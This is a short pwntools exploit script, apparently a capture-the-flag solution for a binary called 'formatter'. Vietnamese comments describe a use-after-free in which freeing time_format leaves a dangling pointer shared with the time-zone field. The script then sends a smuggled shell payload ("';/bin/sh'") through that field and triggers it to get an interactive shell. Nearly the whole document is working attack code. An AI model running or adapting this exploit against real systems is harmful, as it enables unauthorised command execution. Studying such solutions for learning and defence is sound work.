from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
break * 0x400e33
break * 0x400e8f
break * 0x400e53
break * 0x400efd
break * 0x400f68
b* 0x400faa
continue
'''.format(**locals())

#Binary filename
exe = './formatter'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()

# set cho time_format sau do free o choice 5 thi se khien 2 ptr cua time_format 
# zone tro cung vi tri, sau do cho /bin/sh vao se la vi tri cua time_format 
# va cung ko bi gioi han chu cai

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Format: ", b"a" * 8)
p.sendlineafter(b"> ", b"5")
p.sendlineafter(b"Are you sure you want to exit (y/N)? ", b"N")
p.sendlineafter(b"> ", b"3")
p.sendlineafter(b"Time zone: ", b"';/bin/sh'")

p.sendlineafter(b"> ", b"4")

p.interactive()
